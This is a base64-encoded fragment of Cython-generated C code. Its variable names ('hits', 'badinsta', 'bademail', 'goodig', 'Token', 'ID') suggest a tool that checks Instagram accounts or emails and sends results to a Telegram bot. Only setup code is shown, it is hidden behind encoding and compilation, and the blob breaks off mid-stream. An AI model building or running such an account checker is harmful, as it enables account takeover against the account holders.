ZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvbG9ycywgX19weXhfdF80LCBfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDc0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hbGlnbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NlbnRlciwgX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDFfZXJyb3IpXG4gICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFja2dyb3VuZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlZCwgX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrMiwgMykgPCAoMCkpIF9fUFlYX0VSUigwLCA3NCwgX19weXhfTDFfZXJyb3IpXG4gICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BhY2UsIFB5X1RydWUsIF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzKzIsIDQpIDwgKDApKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fcHl4X3RfMyA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF8xMCk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICB9XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbG9nbywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDc0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNSA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgX19weXhfdF8xMCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2xvZ28pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA3NiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfdF80fTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDc2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8xMCA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgX19weXhfdF80ID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTR9O1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA3NywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNCA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNzgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NsZWVwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNzgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgX19weXhfdF82ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xfTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDc4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90b3RhbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgODAsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgxLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRpbnN0YSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZGVtYWlsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA4MywgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ29vZGlnLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA4NCwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgODUsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2IsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3RfMTJbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM4XzU7XG4gIF9fcHl4X3RfMTJbMV0gPSBfX3B5eF90XzU7XG4gIF9fcHl4X3RfMTJbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbTtcbiAgX19weXhfdF8zID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xMiwgMywgNyArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSkgKyAxLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF81KSk7XG4gIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JvLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF81ID0gTlVMTDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpO1xuICBfX3B5eF90XzQgPSBfX3B5eF9idWlsdGluX3ByaW50OyBcbiAgX19weXhfdF8xMCA9IF9fUHl4X1B5U2VxdWVuY2VfTXVsdGlwbHkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzM5bSwgNjApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgODcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90XzEwfTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgODcsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzQgPSBOVUxMO1xuICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9pbnB1dCk7XG4gIF9fcHl4X3RfMTAgPSBfX3B5eF9idWlsdGluX2lucHV0OyBcbiAgX19weXhfdF82ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE1fTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg4LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1Rva2VuLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgODgsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8xMCA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgX19weXhfdF80ID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5U2VxdWVuY2VfTXVsdGlwbHkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzM5bSwgNjApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA4OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X3RfNX07XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDg5LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF80ID0gTlVMTDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5faW5wdXQpO1xuICBfX3B5eF90XzUgPSBfX3B5eF9idWlsdGluX2lucHV0OyBcbiAgX19weXhfdF82ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE2fTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDkwLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0lELCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgOTAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMm9wXzFwcHBwLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29wLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNF0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcHBwLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV95eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F6ZXJ0eXVpb3BtbGtqaGdmZHNxd3hjdmJuKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEwOCwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIF9fcHl4X3RfMyA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJvcF8zdGxsLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGxsLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3AsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls1XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGwsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxMTEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF81ID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNjEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgX19weXhfdF82ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIE5VTEx9O1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTYxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMm9wXzVyZXN0LCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVzdCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29wLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNl0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTY0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVzdCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzMgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8yb3BfN2RhdGUsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRlLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3AsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls3XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxOTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8z